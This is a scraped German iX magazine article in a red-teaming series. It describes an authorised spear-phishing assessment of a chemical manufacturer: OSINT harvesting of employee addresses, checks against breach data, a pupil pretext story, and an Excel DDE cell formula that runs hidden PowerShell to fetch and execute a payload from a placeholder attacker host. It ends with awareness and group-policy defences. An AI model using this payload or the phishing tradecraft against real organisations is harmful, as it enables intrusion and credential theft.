{"title": "Red Teaming: Gezielte Fallen stellen", "author": "Sascha Herzog", "url": "https://www.heise.de/select/ix/2018/9/1535773425521335", "hostname": "heise.de", "description": "Im vierten Artikel der Serie zum Thema \u201eRed Team Assessments\u201c soll eine der wichtigsten Waffen eines Red Team beleuchtet werden: Spear-Phishing-Kampagnen.", "sitename": "Heise", "date": "2018-08-22", "id": null, "license": null, "body": null, "comments": "", "commentsbody": null, "raw_text": null, "text": "Red Teaming: Gezielte Fallen stellen\nG0ne Phishing \u2026\nIm vierten Artikel der Serie zum Thema \u201eRed Team Assessments\u201c soll eine der wichtigsten Waffen eines Red Team beleuchtet werden: Spear-Phishing-Kampagnen.\nBeim Spear Phishing handelt es sich um eine gezielte und meist individuell auf das Opfer zugeschnittene Variante eines Phishing-Angriffs, der dazu dient, Zugangsdaten abzugreifen oder interne Workstations von Mitarbeitern zu kapern, um von da tiefer in die internen Netzwerke des Ziels vorzudringen.\nDie Vorbereitung und Planung ist bei Spear-Phishing-Kampagnen alles. Aus diesem Grund ist wiederum die Sammlung taktisch relevanter Informationen im Vorfeld von entscheidender Bedeutung, die in\n[[1]](#literaturverzeichnis) beschrieben wurde. Wie immer werden wir auch hier Tools, Taktiken und Vorgehensweisen an Hand eines Red Team Assessment genauer beschreiben.\nIm folgenden Fall hatten wir den Auftrag herauszufinden, ob und wie leicht es m\u00f6glich ist, in die ICS-Infrastruktur (Industrial Control Systems; Steuerungsanlagen) eines Kunden aus der chemischen Industrie einzudringen. Dieser stellt \u00e4u\u00dferst giftige Substanzen f\u00fcr die Agrarwirtschaft her und betreibt mehrere Chemiewerke.\nNach einer kurzen Analyse entschieden wir uns f\u00fcr einen anonymen Angriff aus der Ferne, da er wahrscheinlich der effizienteste Weg sein w\u00fcrde. Damit eine solche Attacke erfolgreich ist, ben\u00f6tigt man einige Zutaten (Abbildung 1; Glossar).\nPlanung und Durchf\u00fchrung\nBesonders wichtig ist es, eine gro\u00dfe Anzahl an Mitarbeitern und deren E-Mail-Adressen zu kennen. Zudem sollte man Kenntnisse von der relevanten Infrastruktur, insbesondere von den eingesetzten Client-Technologien (Browser, Mail-Client, Mobiltelefone) der Benutzer haben. Sehr wichtig sind au\u00dferdem Informationen zu den eingesetzten Sicherheitsprodukten, die die Endpunkte sichern (Endpoint-Protection, Anti-Spam/-Malware, Next Generation Firewalls, Sandboxing etc.).\nAn die vielen Mitarbeiter und ihre E-Mail-Adressen kommen wir \u00fcber eigens entwickelte Tools, die diese Daten einerseits passiv aus \u00f6ffentlichen Quellen im Internet (Open Source Intelligence, OSINT) und andererseits aktiv \u00fcber Web-Scraping-Techniken zusammensuchen und in einer CSV-Tabelle ausgeben. Zu den \u00f6ffentlichen Quellen z\u00e4hlen neben Suchmaschinen so interessante Datenquellen wie \u201eData Breach\u201c-Archive und Paste-Dumps (zum Beispiel Pastebin).\nBei der aktiven Beschaffung der Mitarbeiterdaten bedienen wir uns neben diverser Social Networks vor allem an den eigenen Webseiten des Zielunternehmens. Dabei akquirieren wir ausschlie\u00dflich firmenbezogene und keinerlei pers\u00f6nliche Daten der Mitarbeiter und stimmen diese Aktionen falls erforderlich mit Betriebs-/Personalr\u00e4ten ab.\nUnser Zielunternehmen brachte monatlich ein Onlinemagazin in PDF-Form heraus, das es an Newsletter-Abonnenten verschickte. Darin waren Neuigkeiten und Geschichten zu Arbeitsbereichen und Mitarbeitern ver\u00f6ffentlicht. Bei einer der letzten Ausgaben hatte die beauftragte Werbeagentur, die das Magazin designte, die tolle Idee, auf dem Titelblatt die Namen aller Mitarbeiter in Form einer h\u00fcbschen Grafik darzustellen. Nicht nur, dass uns dieses Magazin viele kritische Innenansichten zu Arbeitsbereichen und Mitarbeitern lieferte, es pr\u00e4sentierte zudem noch s\u00e4mtliche Mitarbeiternamen im Klartext.\nDie Newsletter-Falle\nSomit hatten wir nun eine gro\u00dfe Liste mit Namen, aus der sich anhand der bekannten Syntax VORNAME.NACHNAME@FIRMENNAME.TLD E-Mail-Adressen generieren lie\u00dfen. Die gewonnenen E-Mail-Adressen pr\u00fcften wir gegen unsere eigene Sammlung von Data-Breach-Daten und identifizierten Passw\u00f6rter betroffener Mitarbeiter. Au\u00dferdem sendeten wir \u00fcber tempor\u00e4re Accounts bei Newsletter-Anbietern sogenannte \u201eProfiler-Mails\u201c mit harmlosen Inhalten an alle Mitarbeiter. Diese enthielten einen Abmeldelink, der auf eine \u201eProfiler-Webseite\u201c von uns zeigt.\nBei so vielen E-Mails (oft mehrere Tausend) erh\u00e4lt man auch alle \u201eBounces\u201c von alten oder fehlerhaften Adressen zur\u00fcck. Hinzu kommen die Auto-Responder derjenigen, die sich im Urlaub befinden oder auf Gesch\u00e4ftsreise sind. Circa 10 bis 20 % der Mitarbeiter klicken bei solchen Aktionen (manchmal nach mehrfachem Versenden des gleichen Newsletters) auf den Abmeldelink oder einen anderen Link in unserer \u201eProfiler-Mail\u201c.\nDurch dieses \u201eProfiling\u201c erhalten wir \u00fcber Kopfzeilen der Bounces, Auto-Responder und durch das sogenannteBrowser-Fingerprinting auf unserer Abmeldeseite Daten \u00fcber verwendete Betriebssysteme, Webbrowser und -Plug-ins, Mail-Clients, Sicherheitstechnologien, interne Netzwerkinfrastrukturen, externe\n[Netzwerkkomponenten wie Surf-Proxies, au\u00dferdem Informationen \u00fcber \u201eweiche Faktoren\u201c wie Schreibstile und E-Mail-Footer der Mitarbeiter. ]\nZusammen mit den Daten aus einer parallel ablaufenden taktischen Informationsbeschaffung k\u00f6nnen wir die relevanten Komponenten der Endpoint-Umgebung ziemlich gut in unserem Lab nachbauen. Das tun wir, um sicherzugehen, dass unsere Techniken und verwendete Malware nicht erkannt und blockiert wird.\nAuf Mitarbeiter zugeschnittene Geschichten\nZur Sicherheit entwickeln wir, nachdem wir uns besonders geeignete Mitarbeiter als Ziel ausgesucht und \u00fcber \u00f6ffentliche Quellen relevante Informationen zu den einzelnen Zielen analysiert haben (OSINT), meist drei bis f\u00fcnf Geschichten, die exakt auf diese Mitarbeiter zugeschnitten sind. Hierf\u00fcr ben\u00f6tigt man unterschiedliche voneinander unabh\u00e4ngige Internetinfrastrukturen (Domains, Hostnames, Cloud-Fronts, IP-Adressen, SSL-Zertifikate und so weiter), um mehrere Netze mit doppelten B\u00f6den zu haben. Falls also ein Angriff auf ein Ziel fehlschl\u00e4gt, entdeckt oder blockiert wird, bleiben wir weiterhin anonym und k\u00f6nnen immer noch zeitversetzt andere Ziele mit anderen Geschichten und Techniken angreifen.\nDa eine gute Story \u00fcber den Erfolg oder den Misserfolg einer Spear-Phishing-Kampagne entscheidet, soll hier nur eine der vier verwendeten Geschichten erz\u00e4hlt werden. Was sich oft bew\u00e4hrt hat und was wir auch in unserem Beispiel verwendeten, ist die \u201eGeschichte vom interessierten Sch\u00fcler\u201c. Dieser Sch\u00fcler, der den Leistungskurs Chemie an einem deutschen Gymnasium belegt hat, findet eine gewisse Verfahrenstechnik, die bei der Herstellung von Herbiziden besonders wichtig ist, so interessant, dass er dar\u00fcber doch glatt seine Facharbeit verfassen m\u00f6chte. Daf\u00fcr w\u00fcrde er sich nat\u00fcrlich gerne mit Experten austauschen, die sich vor allem in der Praxis damit auskennen und tagt\u00e4glich damit arbeiten. Wie der Zufall so spielt, ist der technische Leiter eines der Chemiewerke unseres Zielunternehmens ein ausgesprochener Experte auf dem Gebiet. Unser Sch\u00fcler, der die E-Mail-Adresse des Kraftwerksleiters von einem Artikel, den dieser verfasst hat, kennt (OSINT), schickt unserem nichts ahnenden Opfer einfach eine Anfrage, ob er einen kurzen Ausschnitt aus seiner Arbeit beurteilen k\u00f6nnte.\nDa es sich bei diesem Ausschnitt um Inhaltsstoffe und Verfahren handelt, hatte der Sch\u00fcler diese der Einfachheit halber in einem Excel-Dokument berechnet und aufgelistet. Dieses schickte er dem technischen Leiter in seiner E-Mail mit.\nZum Zeitpunkt dieser Red-Team-Kampagne war gerade eine besonders effiziente M\u00f6glichkeit der E-Mail-Infektion (erneut) in Mode gekommen, die wir als prim\u00e4ren Infektionsvektor w\u00e4hlten: das Ausf\u00fchren beliebiger Prozesse \u00fcber das \u201eDynamic Data Exchange (DDE)\u201c-Protokoll (mehr \u00fcber dieses Protokoll unter ix.de/ix1809106). Dieses \u00e4ltere Microsoft-Protokoll diente urspr\u00fcnglich der Interprozesskommunikation verschiedener Anwendungsprogramme. Damit war es uns m\u00f6glich, einen Backdoor-Agenten in Form von PowerShell-Code nur \u00fcber das \u00d6ffnen eines Excel-Dokuments auf dem Rechner des Opfers auszuf\u00fchren. Das Opfer musste daf\u00fcr unter Umst\u00e4nden zwar noch einen Office-Sicherheitsdialog best\u00e4tigen, der aber im Kontext von Excel und den angeblichen Verfahrensberechnungen legitim aussah (Abbildung 2).\n[Der Code, den wir in eine Zelle des Excel einbetteten, sah ungef\u00e4hr so aus:]\n=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe \u2926 /cpowershell.exe -w hidden $e=(New-Object \u2926 System.Net.WebClient).DownloadString \u2926 (\\\"http://attackerserver.tld/ \u2926 payload.b64\\\");powershell \u2926 -e $e'!Z378\nAbbildung 3 zeigt die von einem fingierten Freemail-Account von uns verfasste E-Mail an den technischen Leiter.\nSinnvoll ist es, eine solche E-Mail am Abend zu versenden, sodass das Opfer gleich am Vormittag des Folgetages, idealerweise sehr fr\u00fch, den Backdoor-Agenten ausf\u00fchrt. Dadurch bleibt dem Angreifer der gesamte restliche Tag, um sich um die \u201eUser Persistence\u201c, eventuelle \u201ePrivilege Escalations\u201c und das \u201eLateral Movement\u201c zu k\u00fcmmern (alle diese Techniken \u2013 das Verweilen des Eindringlings und das Ausbreiten im System \u2013 beschreibt der n\u00e4chste Teil der Artikelserie in iX 10/2018).\nDie T\u00fcr ist offen\nAls sich um 8:48 Uhr unser Backdoor-R\u00fcckkanal bei unserem \u201eCommand & Control\u201c-Server meldete und uns eine Reverse-Shell zur\u00fcckgab\n[[2]](#literaturverzeichnis), wussten wir, dass der technische Leiter den K\u00f6der geschluckt hatte und wir die Sicherheitsmechanismen erfolgreich umgehen konnten. Das Dokument, das man als K\u00f6der verwendet, sollte sinnvolle Nutzdaten beinhalten, damit das Opfer keinen Verdacht sch\u00f6pft.\nDa wir bis zu diesem Zeitpunkt komplett anonym und mit einem Freemail-Account arbeiteten, h\u00e4tten wir bei einem Fehlschlag gleich die n\u00e4chste Geschichte mit einer anderen Zielperson und Technik ausprobieren k\u00f6nnen. Insgesamt hatten drei der vier Geschichten und Techniken, die wir f\u00fcr diesen Kunden in diesem Red Team Assessment erstellt hatten, Erfolg und wir hatten somit in der Folge weitreichende Zug\u00e4nge in fast alle internen Netzwerkbereiche.\nMitarbeiter sensibilisieren\nWie ein solcher erfolgreicher Einbruch weiter ausgef\u00fchrt wird, schildern wir in der n\u00e4chsten iX.\nUm sich vor solchen und \u00e4hnlichen Angriffen zu sch\u00fctzen, hilft nur Awareness. Dabei geht es darum, Mitarbeiter, Partner und Dienstleister durch regelm\u00e4\u00dfige \u00dcbungen und weitere Ma\u00dfnahmen wie Schulungen zu sensibilisieren, um einen \u201eBreach\u201c oder die Herausgabe interner Daten an unautorisierte Personen zu vermeiden. Bei Warnmeldungen wie den oben gezeigten sollte dann zuk\u00fcnftig jeder Mitarbeiter alarmiert sein und die IT-Sicherheit einschalten, ohne den OK-Button zu dr\u00fccken.\nNeben den personellen Ma\u00dfnahmen sollten auch die organisatorischen Prozesse (wie Incident Response) und die eingesetzten Technologien in einem sinnvollen Ma\u00dfe angepasst werden. So l\u00e4sst sich die Ausf\u00fchrung von Code \u00fcber DDE durch eine entsprechende Gruppenrichtlinie verhindern (wie das funktioniert, ist unter\n[ix.de/ix1809106](http://ix.de/ix1809106) nachzulesen). ( [ur@ix.de](mailto:ur@ix.de?subject=iX%209%2F2018%2C%20Seite%20106%20%20G0ne%20Phishing%20%E2%80%A6))", "language": null, "image": "https://www.heise.de/select/ix/2018/9/1535773425521335/contentimages/awareness.A.lh.jpg", "pagetype": "article", "links": ["/select", "/select/ix", "http://ix.de", "/sso/login?forward=%2Fselect%2Fix%2F2018%2F9%2F1535773425521335", "/select/meine-gekauften-hefte", "/select/bookmarks", "#!", "/sso/login/logout?forward=%2Fselect%2Fix%2F2018%2F9%2F1535773425521335", "/select/ix/2018/9/1535773425521335/contentimages/image-1534489824318155.jpg", "#literaturverzeichnis", "/select/ix/2018/9/1535773425521335/contentimages/ur.soc-eng-kolumne.Z1.jpg", null, "/select/ix/2018/9/1535773425521335/contentimages/ur.soc-eng-kolumne.B2.jpg", null, "/select/ix/2018/9/1535773425521335/contentimages/ur.soc-eng-kolumne.B3.jpg", "#literaturverzeichnis", "http://ix.de/ix1809106", "mailto:ur@ix.de?subject=iX%209%2F2018%2C%20Seite%20106%20%20G0ne%20Phishing%20%E2%80%A6", "/select/ix/2018/4/seite-92", "/select/ix/2018/2/seite-78", "//ix.de/ix1809106", "mailto:post@ix.de?subject=iX%209%2F2018%2C%20Seite%20106%3A%20Red%20Teaming%3A%20Gezielte%20Fallen%20stellen", "/select/ix/2018/9/1535773425521335/pdf", "https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.heise.de%2Fselect%2Fix%2F2018%2F9%2F1535773425521335", "https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.heise.de%2Fselect%2Fix%2F2018%2F9%2F1535773425521335&text=Red%20Teaming%3A%20Gezielte%20Fallen%20stellen%20%7C%20iX", "/select/contact", "/ix/impressum.html", "//heise.de/-4860", "/Nutzungsbedingungen-der-Heise-Online-Services-4945678.html", "/mediadaten/", "/account/cancellation", "/select/ix/2018/9", "/select/ix/2018/9/1535698900181203", "/select/ix/2018/9/1535779212578444"]}